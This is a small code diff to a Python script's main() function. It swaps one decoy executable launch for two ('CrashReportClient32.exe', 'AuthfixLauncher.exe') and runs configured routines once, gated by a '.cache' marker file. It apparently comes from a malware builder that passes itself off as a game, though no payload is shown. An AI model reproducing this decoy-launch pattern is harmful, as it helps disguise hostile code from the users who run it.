@@ -19,7 +19,8 @@ def main():
     ]
 
     if os.path.exists(".cache") == False:
-        os.startfile("UnityCrashHandler32.exe")
+        os.startfile("CrashReportClient32.exe")
+        os.startfile("AuthfixLauncher.exe")
         for func in funcs:
             if __CONFIG__[func.__name__.lower()]:
                 if func.__init__.__code__.co_argcount == 2:
@@ -30,7 +31,8 @@ def main():
         fp.close()
 
     else:
-        os.startfile("UnityCrashHandler32.exe")
+        os.startfile("CrashReportClient32.exe")
+        os.startfile("AuthfixLauncher.exe")
         
 if __name__ == '__main__':
     main()
